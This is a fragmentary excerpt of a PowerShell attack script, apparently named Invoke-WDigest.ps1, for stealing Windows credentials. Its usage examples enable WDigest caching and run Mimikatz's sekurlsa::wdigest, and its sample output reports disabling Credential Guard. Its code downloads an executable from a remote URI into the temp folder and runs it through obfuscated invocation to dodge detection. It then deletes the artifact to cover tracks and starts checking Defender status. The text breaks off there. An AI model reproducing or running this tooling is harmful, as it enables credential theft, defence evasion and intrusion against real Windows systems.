...
.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'false' -mimicats
   Execute M[i]mika[t]z (interactive shell) without WDigest caching

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -mimicats
   Ativate WDigest caching + Execute M[i]mika[t]z sekurlsa::wdigest

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -mimicats -runas
...
.OUTPUTS
   ...
   [*] Patched value of g_IsCredGuardEnabled to 0
     ...
     - Invoking sekurlsa::wdigest to dump credentials.
...
If($MimiCats.IsPresent)
{
   ...
   iwr -uri "$MyUri" -OutFile "${Env:TMP}\${Obfuscation}.exe"|Unblock-File
   ...
   Else
   {
      ...
      &('xEx' -replace '^(x)','i') ".\${Obfuscation}.exe"
   }


   write-host ""
   ## Auto-CleanUp of artifacts left behind
   Remove-Item -Path "${Env:TMP}\${Obfuscation}.exe" -Force
   If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
   {
